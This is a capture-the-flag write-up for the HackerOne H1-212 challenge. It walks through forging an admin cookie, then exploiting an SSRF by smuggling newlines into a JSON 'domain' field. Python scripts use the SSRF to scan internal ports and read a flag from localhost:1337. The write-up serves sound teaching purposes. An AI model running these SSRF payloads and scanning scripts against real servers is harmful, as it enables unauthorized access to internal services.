# h1-212 CTF Writeup

As an avid CTF'er, I was very much excited when I heard about the **H1-212 CTF**.
Thus, letting my misguided priorities get the better of me, I decided to set my
studies aside and try this HackerOne CTF :smile:

It didn't take me too long though to realize that I suck at bug bounties and that
this challenge wasn't going to be easy...

## :hammer_and_pick: The challenge :hammer_and_wrench:

Here is the description that is given to us when starting this CTF.

```
An engineer of acme.org launched a new server for a new admin panel at
http://104.236.20.43/. He is completely confident that the server
can’t be hacked. He added a tripwire that notifies him when the flag file
is read. He also noticed that the default Apache page is still there,
but according to him that’s intentional and doesn’t hurt anyone.
Your goal? Read the flag!
```


There's a couple of interesting elements that are worth noting :

- The **acme.org** domain
- The IP address **104.236.20.43**
- The new **admin panel**

If we try poking a website at **acme.org**, you'll realize soon enough that **acme.org** isn't
resolving to the **IP address** from the description above.

```bash
$ nslookup acme.org
Server:         8.8.8.8
Address:        8.8.8.8#53

Non-authoritative answer:
Name:   acme.org
Address: 69.64.156.78 <=== This is wrong!
```

I'll assume that **HackerOne** doesn't own the **acme.org** domain. So let's add the actual IP
to our host file.

```bash
$ echo '104.236.20.43 acme.org' | sudo tee -a /etc/hosts
104.236.20.43 acme.org

$ ping acme.org
PING acme.org (104.236.20.43): 56 data bytes
^C
--- acme.org ping statistics ---
1 packets transmitted, 0 packets received, 100.0% packet loss
```

Now if we visit http://acme.org, we get the default Apache page as mentionned in the description!

```bash
$ curl http://acme.org 2>&1 | grep title
    <title>Apache2 Ubuntu Default Page: It works</title>
```

## :door: Finding the Admin Panel :door:

If there is one thing that I've learned from doing CTFs, it's that **vulnerability scanners
and automated tools such as (SQLMap, Nmap, ...) are rarely the solution**.

Our **acme.org** engineer mentionned the existence of an **admin panel**. If we assume that this
CTF is no different than any other CTF, then the **admin panel** should be easy to find...

So I started poking the webserver at the following URIs :
- `/robots.txt`
- `/.git/HEAD`
- `/admin`
- `/admin.php`
- `/index.php`

... all of which were dead ends.

After a couple of hours of poking around (I admit, I did run dirbuster at some point :disappointed:),
I realised that I should've approached this challenge as a bug bounty/pentest. Therefore, one of the
first things that I should've done is... **list the subdomains**!

As a first guess, let's try to request the server with the `admin.acme.org` host.

```bash
$ curl http://acme.org -H 'Host: admin.acme.org' -v
* Rebuilt URL to: http://acme.org/
*   Trying 104.236.20.43...
* TCP_NODELAY set
* Connected to acme.org (104.236.20.43) port 80 (#0)
> GET / HTTP/1.1
> Host: admin.acme.org
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Wed, 15 Nov 2017 17:11:52 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Set-Cookie: admin=no
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host acme.org left intact
```

> < Set-Cookie: admin=no

Things are getting interesting! :tada:

We'll add our new found subdomain to our host file :
```bash
$ echo '104.236.20.43 admin.acme.org' | sudo tee -a /etc/hosts
```

## (Little Side Note) :notes:

One thing that I've noticed in web CTFs is that people have a really
hard time knowing where to start. Some might even say that web CTFs are mostly
guessing.

The truth is, **challenge designers** will usually have a roadmap in mind when
creating their challenge, a taught process leading participants from **point A
to point B**.

From a player's point of view, this means that **everything is there for a reason**,
and that **the simplest solution is usually the right one**. If you keep that in mind,
web CTFs go from guessing -> puzzle solving and things start making a lot more sense.

The following section is a great example of this way of thinking.

## :four::zero::five: Method Not Allowed
When visiting the **admin.acme.org** website, we're given a blank page
with nothing of interest but a `Set-Cookie: admin=no` header.

The obvious thing to do here is to send back a request containing a cookie `admin=yes`
and see what happens!

```bash
$ curl http://admin.acme.org -b 'admin=yes' -v
* Rebuilt URL to: http://admin.acme.org/
*   Trying 104.236.20.43...
* TCP_NODELAY set
* Connected to admin.acme.org (104.236.20.43) port 80 (#0)
> GET / HTTP/1.1
> Host: admin.acme.org
> User-Agent: curl/7.54.0
> Accept: */*
> Cookie: admin=yes
>
< HTTP/1.1 405 Method Not Allowed
< Date: Wed, 15 Nov 2017 17:27:24 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host admin.acme.org left intact
```

Sending the cookie gives us a new kind of response :
> HTTP/1.1 405 Method Not Allowed

This error code suggests that we're not using the correct **HTTP verb**
for our request. We can compile a short list of common verbs and check
the response for each :

```bash
$ verbs=(GET POST OPTIONS PUT DELETE HEAD)

$ for f in ${verbs[@]}; do curl http://admin.acme.org -b 'admin=yes' -X $f -v 2>&1 | grep "HTTP/1.1"; done
> GET / HTTP/1.1
< HTTP/1.1 405 Method Not Allowed
> POST / HTTP/1.1
< HTTP/1.1 406 Not Acceptable
> OPTIONS / HTTP/1.1
< HTTP/1.1 405 Method Not Allowed
> PUT / HTTP/1.1
< HTTP/1.1 405 Method Not Allowed
> DELETE / HTTP/1.1
< HTTP/1.1 405 Method Not Allowed
> HEAD / HTTP/1.1
< HTTP/1.1 405 Method Not Allowed
```

As we can see, sending a `POST` request triggers another new response!

> HTTP/1.1 406 Not Acceptable

## :four::zero::six: Not Acceptable

406 Not Acceptable is one of those HTTP responses that I'm not too familiar with.
From what I understand, our POST request doesn't match what the webserver wants.

Following the article found [here](http://www.checkupdown.com/status/E406.html),
I played around for hours, trying to figure out which combination of `Accept*` headers
will allow me to move on to the next step.

Then I realised, there's a reason why we're doing a POST request...
The webserver is most likely waiting for some kind of body.
Thus, since we don't know how to encode the body, I shouldn't be looking at
the `Accept*` headers, but rather the `Content-Type` header!

Let's try a couple of common content-types :

```bash
$ curl http://admin.acme.org -X POST -b 'admin=yes' -H 'Content-Type: application/x-www-form-urlencoded' 2>&1 -v | grep HTTP/1.1
> POST / HTTP/1.1
< HTTP/1.1 406 Not Acceptable

$ curl http://admin.acme.org -X POST -b 'admin=yes' -H 'Content-Type: application/json' 2>&1 -v | grep HTTP/1.1
> POST / HTTP/1.1
< HTTP/1.1 418 I'm a teapot

$ curl http://admin.acme.org -X POST -b 'admin=yes' -H 'Content-Type: application/json'
{"error":{"body":"unable to decode"}}
```

So we have to deal with **JSON** now! :tada: We're getting somewhere!!! :blush:

## :computer: The Actual admin.acme.org Feature :computer:

Now that we know we're dealing with JSON, let's try some payloads and see how
the app reacts. The next few steps are pretty much self explanatory...
Take the time to read through the commands I've used below :)

```bash
$ curl http://admin.acme.org -X POST -b 'admin=yes' -H 'Content-Type: application/json' -d '{}'
{"error":{"domain":"required"}}

$ curl http://admin.acme.org -X POST -b 'admin=yes' -H 'Content-Type: application/json' -d '{"domain" : "test"}'
{"error":{"domain":"incorrect value, .com domain expected"}}

$ curl http://admin.acme.org -X POST -b 'admin=yes' -H 'Content-Type: application/json' -d '{"domain" : "test.com"}'
{"error":{"domain":"incorrect value, .com domain expected"}}

$ curl http://admin.acme.org -X POST -b 'admin=yes' -H 'Content-Type: application/json' -d '{"domain" : "www.test.com"}'
{"error":{"domain":"incorrect value, sub domain should contain 212"}}

$ curl http://admin.acme.org -X POST -b 'admin=yes' -H 'Content-Type: application/json' -d '{"domain" : "212.test.com"}'
{"next":"\/read.php?id=0"}

$ curl http://admin.acme.org/read.php?id=0 -b 'admin=yes'
{"data":"PGh0bWw+DQo8aGVhZD48dGl0bGU+MzAyIEZvdW5kPC90aXRsZT48L2hlYWQ+DQo8Ym9keSBiZ2NvbG9yPSJ3aGl0ZSI+DQo8Y2VudGVyPjxoMT4zMDIgRm91bmQ8L2gxPjwvY2VudGVyPg0KPGhyPjxjZW50ZXI+bmdpbngvMS4xMy40PC9jZW50ZXI+DQo8L2JvZHk+DQo8L2h0bWw+DQo="}

$ echo "PGh0bWw+DQo8aGVhZD48dGl0bGU+MzAyIEZvdW5kPC90aXRsZT48L2hlYWQ+DQo8Ym9keSBiZ2NvbG9yPSJ3aGl0ZSI+DQo8Y2VudGVyPjxoMT4zMDIgRm91bmQ8L2gxPjwvY2VudGVyPg0KPGhyPjxjZW50ZXI+bmdpbngvMS4xMy40PC9jZW50ZXI+DQo8L2JvZHk+DQo8L2h0bWw+DQo=" | base64 -D
<html>
<head><title>302 Found</title></head>
<body bgcolor="white">
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.13.4</center>
</body>
</html>
```

Okay! So essentially, we have to give the application a domain name starting with **212**
and ending with **.com**.

Upon success, we're given a link to a `read.php?id=` page which when visited, shows us
what seems to be the HTTP response of **212.test.com** encoded in base64.

We can assume that this **admin.acme.org** web server is actually a web proxy of some sort : we
give it a domain, it fetches the response for us.

This feature screams **SSRF**! :scream:

## :memo: Getting a working SSRF PoC :memo:

When I attack an endpoint of interest, one of the first things I'll do is inject characters from `\x00` to `\x7f`
to determine if there is any filtering or odd behaviors in the feature.

Let's try it out against the `"domain"` value. I created a python script to automate the process.

```python
#!/usr/bin/env python2

import requests
import json

url = "http://admin.acme.org/"
headers = { "Cookie" : "admin=yes", "Content-Type" : "application/json" }


# For characters from 0x0 to 0x7f
for i in xrange(0x7f):
    # Insert the character in the middle of our domain
    domain = "212.te{}st.com".format(chr(i))

    # Encode it for JSON
    data = json.dumps(domain)

    # Create the json object to be sent
    data = '{{"domain" : {}}}'.format(data)

    # Send our payload
    response = requests.post(url, data=data, headers=headers)

    # Check the response
    print repr(domain), response.text
```

A couple of interesting results came out of this.
One of them being that we can't use any of `#%&?\` characters in our **domain name**.
But most importantly, do you notice anything _odd_ from this sample output?

```python
'212.te\x08st.com' {"next":"\/read.php?id=380"}
'212.te\tst.com' {"next":"\/read.php?id=381"}
'212.te\nst.com' {"next":"\/read.php?id=383"}
'212.te\x0bst.com' {"next":"\/read.php?id=384"}
'212.te\x0cst.com' {"next":"\/read.php?id=385"}
```

When we inject a newline (`\n`), the ID **skips from 381 to 383**! I wonder what happened to 382. :thinking:

---

Let's dig in deeper.

I created a payload with two domains seperated by a newline. One is **212.test.com**
and the second one is **1234.com**. As a reference, note that the last ID generated was **622**. Because
of the newline, we should expect a new ID of **624** (**skipping 623**).

```bash
$ curl http://admin.acme.org -X POST -b 'admin=yes' -H 'Content-Type: application/json' -d '{"domain" : "212.test.com\n1234.com"}'
{"next":"\/read.php?id=624"}
```

As expected, `id=623` is not in the response. Let's try to read it anyway.
```bash
$ curl http://admin.acme.org/read.php?id=623 -b 'admin=yes'
{"data":"PGh0bWw+DQo8aGVhZD48dGl0bGU+MzAyIEZvdW5kPC90aXRsZT48L2hlYWQ+DQo8Ym9keSBiZ2NvbG9yPSJ3aGl0ZSI+DQo8Y2VudGVyPjxoMT4zMDIgRm91bmQ8L2gxPjwvY2VudGVyPg0KPGhyPjxjZW50ZXI+bmdpbngvMS4xMy40PC9jZW50ZXI+DQo8L2JvZHk+DQo8L2h0bWw+DQo="}

$ echo 'PGh0bWw+DQo8aGVhZD48dGl0bGU+MzAyIEZvdW5kPC90aXRsZT48L2hlYWQ+DQo8Ym9keSBiZ2NvbG9yPSJ3aGl0ZSI+DQo8Y2VudGVyPjxoMT4zMDIgRm91bmQ8L2gxPjwvY2VudGVyPg0KPGhyPjxjZW50ZXI+bmdpbngvMS4xMy40PC9jZW50ZXI+DQo8L2JvZHk+DQo8L2h0bWw+DQo=' | base64 -D
<html>
<head><title>302 Found</title></head>
<body bgcolor="white">
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.13.4</center>
</body>
</html>
```

We're getting the same response as the **212.test.com** test from earlier! Let's try to read
`id=624` now.

```bash
$ curl http://admin.acme.org/read.php?id=624 -b 'admin=yes'
{"data":"PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4KPGh0bWw+PGhlYWQ+Cjx0aXRsZT4zMDEgTW92ZWQgUGVybWFuZW50bHk8L3RpdGxlPgo8L2hlYWQ+PGJvZHk+CjxoMT5Nb3ZlZCBQZXJtYW5lbnRseTwvaDE+CjxwPlRoZSBkb2N1bWVudCBoYXMgbW92ZWQgPGEgaHJlZj0iaHR0cDovL3d3dy4xMjM0LmNvbS5hdS8iPmhlcmU8L2E+LjwvcD4KPGhyPgo8YWRkcmVzcz5BcGFjaGUgU2VydmVyIGF0IDEyMzQuY29tIFBvcnQgODA8L2FkZHJlc3M+CjwvYm9keT48L2h0bWw+Cg=="}

$ echo "PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4KPGh0bWw+PGhlYWQ+Cjx0aXRsZT4zMDEgTW92ZWQgUGVybWFuZW50bHk8L3RpdGxlPgo8L2hlYWQ+PGJvZHk+CjxoMT5Nb3ZlZCBQZXJtYW5lbnRseTwvaDE+CjxwPlRoZSBkb2N1bWVudCBoYXMgbW92ZWQgPGEgaHJlZj0iaHR0cDovL3d3dy4xMjM0LmNvbS5hdS8iPmhlcmU8L2E+LjwvcD4KPGhyPgo8YWRkcmVzcz5BcGFjaGUgU2VydmVyIGF0IDEyMzQuY29tIFBvcnQgODA8L2FkZHJlc3M+CjwvYm9keT48L2h0bWw+Cg==" | base64 -D
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://www.1234.com.au/">here</a>.</p>
<hr>
<address>Apache Server at 1234.com Port 80</address>
</body></html>
```

This one gives us a legitimate response from **1234.com!**

---

For some reason, the endpoint **splits** our payload on the `\n` character and does a request for **each
part**.

This means we should be able to **bypass the filter** and use the endpoint to request **any website/port**.

Here's an example payload which respects the filter, but causes 3 requests,
including one to `127.0.0.1:22` :
```json
{"domain" : "212.test.com\n127.0.0.1:22\n1234.com"}
```

And here is the resulting response :
```bash
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
Protocol mismatch.
```

**We've successfully queried a non HTTP service running on 127.0.0.1:22.**

## :triangular_flag_on_post: Finding the Flag :triangular_flag_on_post:

Now that we have our **SSRF**, what do we do now? We scan some **ports**!

If we assume that there's an internal service running on **127.0.0.1**,
our next step will be to find the port.

Since we don't want to do this by hand, I created a python script
which automates the process of sending a malicious domain and reading the response.
It does this for ports **0** to **2999**.

```python
#!/usr/bin/env python

import requests
import json
import re
import base64
import sys

url = "http://admin.acme.org/"
headers = { "Cookie" : "admin=yes", "Content-Type" : "application/json" }

def populate(host, port, uri):
    """ Returns id to be used by read.php """

    # Create a malicious domain containing 3 requests : 212, host:port/uri and .com
    data = { "domain" : "212\n{}:{}/{}\n.com".format(host, port, uri) }

    # Send the request
    response = requests.post(url, json=data, headers=headers)

    # Load the JSON response
    response = json.loads(response.text)

    # Fetch the ID containing the response of host:port/uri
    read_id = int(re.findall("id=(\d+)", response['next'])[0]) - 1
    return read_id

def read(read_id):
    """ Read and decode response for a given ID """
    params = { "id" : read_id }
    try:
        response = requests.get(url + "read.php", params=params, headers=headers, timeout=5)
    except:
        # If the request times out, we assume that there's a service running on that port
        return "[Timeout]"

    # Load the JSON response
    response = json.loads(response.text)

    # Decode the base64
    response = base64.b64decode(response['data'])
    return response

# Port scan!
for i in xrange(3000):
    read_id = populate("127.0.0.1", i, "garbage")
    res = read(read_id)
    if res != "":
        print "Open port found : {}".format(i)
        print res
```

After a couple of minutes, we get the following results :

```bash
Open port found : 22
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
Protocol mismatch.

Open port found : 53
[Timeout]

Open port found : 80
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /garbage was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 127.0.0.1 Port 80</address>
</body></html>

Open port found : 1337
<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.10.3 (Ubuntu)</center>
</body>
</html>

```

Ports **22**, **53** and **80** being the standard SSH, DNS and
HTTP services, the only one remaining is port **1337**!

Let's update our script and poke our newly discovered service.

Note : The `client.py` script below is a rewrite of the `populate()` and
`read()` functions from our previous script. Just understand that `client.py`
automates the SSRF attack that we've used previously ;) 

```
$ python client.py 127.0.0.1:1337/
Hmm, where would it be?

$ python client.py 127.0.0.1:1337/flag
FLAG: CF,2dsV\/]fRAYQ.TDEp`w"M(%mU;p9+9FD{Z48X*Jtt{%vS($g7\S):f%=P[Y@nka=<tqhnF<aq=K5:BC@Sb*{[%z"+@yPb/nfFna<e$hv{p8r2[vMMF52y:z/Dh;{6
```

:triangular_flag_on_post:
:triangular_flag_on_post:
:triangular_flag_on_post:

And there you have it! After about a day of head banging against the wall, we finally have our flag!

I was quite pleased with the difficulty of this CTF. If anything, **H1-212 CTF** has confirmed for me
that recon is quite an important step that should not be overlooked ;)

Thank you HackerOne, I'm looking forward to your next event! :tada:
